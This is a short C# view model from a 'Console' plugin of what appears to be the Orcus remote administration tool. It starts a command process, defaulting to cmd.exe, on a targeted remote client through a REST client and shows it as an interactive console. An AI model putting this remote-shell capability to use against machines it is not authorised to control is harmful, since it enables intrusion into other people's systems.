using System.Linq;
using Console.Administration.Controls;
using Console.Administration.Rest;
using Orcus.Administration.Library.Clients;
using Orcus.Administration.Library.Extensions;
using Orcus.Administration.Library.ViewModels;
using Prism.Commands;
using Prism.Regions;

namespace Console.Administration.ViewModels
{
    public class ConsoleViewModel : ViewModelBase
    {
        private readonly IPackageRestClient _restClient;
        private ProcessInterface _processConsole;
        private DelegateCommand _processExitedCommand;

        public ConsoleViewModel(TargetedRestClient restClient)
        {
            _restClient = restClient.CreatePackageSpecific("Console");
        }

        public ProcessInterface ProcessConsole
        {
            get => _processConsole;
            set => SetProperty(ref _processConsole, value);
        }

        public DelegateCommand ProcessExitedCommand
        {
            get { return _processExitedCommand ?? (_processExitedCommand = new DelegateCommand(() => { ProcessConsole.Dispose(); })); }
        }

        public override async void OnNavigatedTo(NavigationContext navigationContext)
        {
            base.OnNavigatedTo(navigationContext);

            var filename = (string) navigationContext.Parameters.FirstOrDefault(x => x.Key == "Filename").Value ?? "cmd.exe";
            var arguments = (string) navigationContext.Parameters.FirstOrDefault(x => x.Key == "Parameter").Value;

            var processWatcher = await ConsoleResource.ProcessWatcher(_restClient);
            ProcessConsole = processWatcher;

            await processWatcher.StartProcess(filename, arguments);
        }
    }
}